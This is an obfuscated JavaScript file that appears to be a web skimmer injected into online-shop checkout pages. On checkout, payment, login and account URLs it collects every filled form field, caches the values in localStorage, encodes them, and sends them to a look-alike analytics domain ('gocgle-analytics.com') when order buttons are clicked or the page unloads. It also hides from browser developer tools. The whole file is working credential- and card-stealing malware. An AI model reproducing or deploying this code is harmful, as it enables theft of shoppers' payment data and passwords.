var polyfill;
var sendBeacon;
var isSupported;
var b2h;
var last;
var progress_;
var th;
var lo;
(function () {
  function Ox$(z, i) {
    var j = z.length;
    var l = [];
    for (var e = 0; e < z.length; e++) {
      l[e] = z.charAt(e);
    }
    for (var e = 0; e < z.length; e++) {
      var a = i * (e + 200) + i % 43467;
      var x = i * (e + 194) + i % 49057;
      var b = a % z.length;
      var c = x % z.length;
      var v = l[b];
      l[b] = l[c];
      l[c] = v;
      i = (a + x) % 1632567;
    }
    var s = '';
    var p = '';
    var n = '%';
    var u = '#1';
    var m = '%';
    var t = '#0';
    var y = '#';
    return l.join('').split('%').join('').split('#1').join('%').split('#0').join('#').split('');
  }
  return function () {
    function O() {
      return clearInterval;
    }
    function bb() {
      return lo;
    }
    function bl() {
      return window;
    }
    function bg() {
      return progress_;
    }
    function bn(a) {
      return ~a;
    }
    function B(a, b) {
      return a - b;
    }
    function Q() {
      return ctr;
    }
    function x(a, b) {
      return a !== b;
    }
    function E(a, b) {
      return a == b;
    }
    function bf() {
      return navigator;
    }
    function R() {
      return d;
    }
    function bk() {
      return u;
    }
    function K() {
      return f;
    }
    function D(a, b) {
      return a <= b;
    }
    function w(a, b) {
      return a != b;
    }
    function U() {
      return gaudid;
    }
    function bd() {
      return lr;
    }
    function be() {
      return Math;
    }
    function z(a, b) {
      return a * b;
    }
    function Z() {
      return lc;
    }
    function ba() {
      return ln;
    }
    function X() {
      return la;
    }
    function Y() {
      return last;
    }
    function S() {
      return Date;
    }
    function bh() {
      return rg;
    }
    function W() {
      return jQuery;
    }
    function bc() {
      return localStorage;
    }
    function F(a, b) {
      return a === b;
    }
    function G(a, b) {
      return a > b;
    }
    function T() {
      return document;
    }
    function V() {
      return h;
    }
    function M() {
      return Array;
    }
    function N() {
      return bs;
    }
    function bj() {
      return TextEncoder;
    }
    function P() {
      return console;
    }
    function L() {
      return ActiveXObject;
    }
    function bm() {
      return XMLHttpRequest;
    }
    function I() {
      return c;
    }
    function H(a, b) {
      return a in b;
    }
    function bo(a) {
      return !a;
    }
    function J() {
      return e;
    }
    function bi() {
      return String;
    }
    function y(a, b) {
      return a % b;
    }
    function A(a, b) {
      return a + b;
    }
    function C(a, b) {
      return a < b;
    }
    function p() {
      var b = {};
      for (var a = 0; a < arguments.length; a += 2) {
        b[arguments[a]] = arguments[a + 1];
      }
      return b;
    }
    function k(r, i) {
      var m = {};
      var j = {};
      var g = {};
      var s = {};
      var l = {};
      var k = {};
      var w = {};
      m._ = i;
      var e = r.length;
      j._ = [];
      for (var f = 0; f < r.length; f++) {
        j._[f] = r.charAt(f);
      }
      for (var f = 0; f < r.length; f++) {
        g._ = m._ * (f + 200) + m._ % 43467;
        s._ = m._ * (f + 194) + m._ % 49057;
        l._ = g._ % r.length;
        k._ = s._ % r.length;
        w._ = j._[l._];
        bp(l, j, k);
        bq(k, j, w);
        br(m, g, s);
      }
      var p = '';
      var x = '';
      var v = '%';
      var q = '#1';
      var a = '%';
      var c = '#0';
      var b = '#';
      return j._.join('').split('%').join('').split('#1').join('%').split('#0').join('#').split('');
    }
    function b() {
      if (e()) {
        return;
      }
      if (!('navigator' in this)) {
        this.navigator = {};
      }
      this.navigator.sendBeacon = c.bind(this);
    }
    function c(e, b) {
      var f = {};
      const c = this.event && this.event.type;
      f._ = 'XMLHttpRequest' in this ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
      f._.open('POST', e);
      bt(f);
      f._.setRequestHeader('Accept', '*/*');
      f._.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
      try {
        f._.send(b);
        console.log(f._);
      } catch (error) {
        return false;
      }
      return true;
    }
    function e() {
      return 'navigator' in this && 'sendBeacon' in this.navigator;
    }
    function f(b) {
      bs = new TextEncoder().encode(b);
      h = Array.from(bs, b => b.toString(16).padStart(2, '0')).join('');
      return h.split('').reverse().join('');
    }
    function g() {
      var e = {};
      var f = {};
      var f = {};
      var f = {};
      var b = {};
      var c = {};
      var l = {};
      var j = [];
      bu();
      e._ = document.querySelectorAll('input, checkbox, textarea, select');
      f._ = 0;
      for (; f._ < e._.length; f._++) {
        if (e._[f._].value.length > 0) {
          b._ = e._[f._].name;
          bv(b, f, e);
          bw(b, f, e);
          c._ = '';
          if (j.indexOf(b._) === -1) {
            j.push(b._);
            bx(c, f, e);
          } else {
            if (j.indexOf(b._) > -1) {
              c._ = e._[f._].value + '&' + b._ + '=' + localStorage.getItem(b._);
            }
          }
          localStorage.setItem(b._, c._);
        }
      }
      if (!jQuery('select[name="region"] option:selected').val() && !jQuery('input[name="region"]').val() && jQuery('select[name="region_id"] option:selected').val() && jQuery('select[name="region_id"] option:selected').text()) {
        rg = jQuery('select[name="region_id"] option:selected').text();
        localStorage.setItem('region', rg);
      }
      now = Date.now();
      if (last + 500 > now) {
        return false;
      }
      by();
      la = [
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z',
        '0',
        '1',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9'
      ];
      ln = [
        '0',
        '1',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9'
      ];
      bz();
      f._ = 0;
      for (; f._ < la.length; f._++) {
        for (var g = 0; g < ln.length; g++) {
          lc.push(la[f._] + ln[g]);
        }
      }
      lr = la.concat(ln, lc);
      bA();
      while (ctr > 0) {
        f._ = Math.floor(Math.random() * ctr);
        bB();
        bC();
        bD(f);
        bE(f);
      }
      lr.sort(q());
      if (localStorage.getItem('gaudid') === null) {
        gaudid = [...Array(16)].map(b => (~~(Math.random() * 36)).toString(36)).join('').toUpperCase();
        localStorage.setItem('gaudid', gaudid);
      } else {
        gaudid = localStorage.getItem('gaudid');
      }
      f._ = 0;
      for (; f._ < localStorage.length; f._++) {
        var i = localStorage.key(f._);
        var k = localStorage.getItem(i);
        if (i != 'infoResult' && k.length <= 1000) {
          d += lr[f._] + '=' + f(i + '=' + k) + '&';
        }
      }
      if (!navigator.sendBeacon(u, d)) {
        l._ = 'XMLHttpRequest' in this ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
        l._.open('POST', u);
        bF(l);
        l._.setRequestHeader('Accept', '*/*');
        l._.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
        bG(l);
        try {
          l._.send(d);
        } catch (error) {
        }
      }
    }
    function i() {
      jQuery(document).on('click', "button, .form-button, .onestepcheckout-button, .btn, .button, #onestepcheckout-place-order, .onestepcheckout-place-order, .onestepcheckout-place-order-wrapper, input[type='submit'], button span:contains('Place Order'), button span:contains('Complete order'), button span:contains('Place order now')", s());
      jQuery("button, .form-button, .onestepcheckout-button, .btn, .button, #onestepcheckout-place-order, .onestepcheckout-place-order, .onestepcheckout-place-order-wrapper, input[type='submit'], button span:contains('Place Order'), button span:contains('Complete order'), button span:contains('Place order now')").on('click', v());
    }
    function j() {
      progress_();
    }
    function l() {
      last = 0;
    }
    function m() {
      th = 160;
    }
    function q() {
      return function (b, c) {
        return b.length - c.length;
      };
    }
    function s() {
      return function () {
        progress_();
      };
    }
    function v() {
      return function () {
        progress_();
      };
    }
    function r() {
      return function () {
        '';
      };
    }
    var a = [
      '',
      'post',
      'location',
      'https://www.gocgle-analytics.com/__utm.gif',
      'test',
      'onepage|checkout|onestep|payment|admin|account|login|password|cart|osc',
      'object',
      'call',
      'navigator',
      'sendBeacon',
      'bind',
      'event',
      'type',
      'XMLHttpRequest',
      'Microsoft.XMLHTTP',
      'POST',
      'open',
      'withCredentials',
      'Accept',
      '*/*',
      'setRequestHeader',
      'Content-Type',
      'text/plain;charset=UTF-8',
      'send',
      'log',
      'encode',
      'join',
      '0',
      'padStart',
      'toString',
      'from',
      'reverse',
      'split',
      'noConflict',
      'input, checkbox, textarea, select',
      'querySelectorAll',
      'length',
      'value',
      'name',
      'id',
      '=',
      '&',
      'indexOf',
      'push',
      'getItem',
      'setItem',
      'val',
      'select[name="region"] option:selected',
      'input[name="region"]',
      'select[name="region_id"] option:selected',
      'text',
      'region',
      'now',
      'abcdefghijklmnopqrstuvwxyz0123456789',
      '0123456789',
      'concat',
      'random',
      'floor',
      'sort',
      'gaudid',
      'toUpperCase',
      'map',
      'key',
      'infoResult',
      'responseType',
      'text/plain',
      'outerWidth',
      'innerWidth',
      'outerHeight',
      'innerHeight',
      'Firebug',
      'chrome',
      'isInitialized',
      'click',
      "button, .form-button, .onestepcheckout-button, .btn, .button, #onestepcheckout-place-order, .onestepcheckout-place-order, .onestepcheckout-place-order-wrapper, input[type='submit'], button span:contains('Place Order'), button span:contains('Complete order'), button span:contains('Place order now')",
      'on',
      'beforeunload'
    ];
    polyfill = b;
    sendBeacon = c;
    isSupported = e;
    b2h = f;
    progress_ = g;
    t = '';
    d = '';
    o = 'post';
    n = window.location;
    u = 'https://www.gocgle-analytics.com/__utm.gif';
    if (new RegExp('onepage|checkout|onestep|payment|admin|account|login|password|cart|osc').test(n)) {
      b.call(typeof window === 'object' ? window : this || {});
      jQuery.noConflict();
      l();
      m();
      lo = setInterval(() => {
        const c = window.outerWidth - window.innerWidth > th;
        const b = window.outerHeight - window.innerHeight > th;
        if (!(b && c) && (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || c || b)) {
          bH();
          clearInterval(lo);
        }
      }, 500);
      jQuery(i);
      addEventListener('beforeunload', j);
    }
    function bp(c, a, b) {
      a._[c._] = a._[b._];
    }
    function bq(b, a, c) {
      a._[b._] = c._;
    }
    function br(b, a, c) {
      b._ = (a._ + c._) % 1632567;
    }
    function bt(b) {
      b._.withCredentials = true;
    }
    function bu() {
      d = '';
    }
    function bv(b, e, c) {
      if (b._ == '' && c._[e._].id !== '') {
        b._ = c._[e._].id;
      }
    }
    function bw(b, e, c) {
      if ('' == b._) {
        b._ = e._;
      }
      t += b._ + '=' + c._[e._].value + '&';
    }
    function bx(b, e, c) {
      b._ = c._[e._].value;
    }
    function by() {
      last = now;
    }
    function bz() {
      lc = [];
    }
    function bA() {
      ctr = lr.length;
    }
    function bB() {
      ctr--;
    }
    function bC() {
      tmp = lr[ctr];
    }
    function bD(a) {
      lr[ctr] = lr[a._];
    }
    function bE(a) {
      lr[a._] = tmp;
    }
    function bF(b) {
      b._.withCredentials = true;
    }
    function bG(b) {
      b._.responseType = 'text/plain';
    }
    function bH() {
      progress_ = r();
    }
  }.apply(this, arguments);
}());